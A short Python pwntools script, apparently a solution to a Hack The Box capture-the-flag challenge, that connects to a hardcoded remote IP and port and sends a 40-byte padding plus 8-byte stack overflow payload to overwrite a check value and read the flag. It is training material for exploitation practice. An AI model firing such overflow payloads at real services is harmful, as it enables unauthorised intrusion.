#!/usr/bin/python3.8

'''
You need to install pwntools to run the script.
To run the script: python3 ./wrapper.py
'''

# Library
from pwn import *

# Open connection
IP   = '83.136.249.164' # Remote server
PORT = 56976            # Remote port

r    = remote(IP, PORT)

# Craft payload
# Buffer is at -0x30, check value at -0x8
# Distance = 0x30 - 0x8 = 0x28 = 40 bytes
# We need to overwrite the check value with anything other than 0xdeadbeef
payload = b'A' * 40 + b'BBBBBBBB'  # 40 bytes padding + 8 bytes to overwrite check

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')